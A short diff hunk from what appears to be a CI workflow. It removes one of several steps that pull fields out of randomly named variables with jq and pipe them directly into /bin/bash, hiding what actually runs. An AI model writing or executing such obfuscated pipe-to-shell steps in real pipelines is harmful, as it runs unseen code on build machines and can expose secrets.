@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$llho3842" | jq -r .haysy91 | /bin/bash
           echo $bmotf0 | jq -r .i0 | /bin/bash
           printf '%s' "$c253" | jq -r .fjq71 | /bin/bash
-          printf '%s' "$rspl11592" | jq -r .cooja12854 | /bin/bash
           printf '%s' "$chtu80" | jq -r .mt46 | /bin/bash
 
       - name: Save output
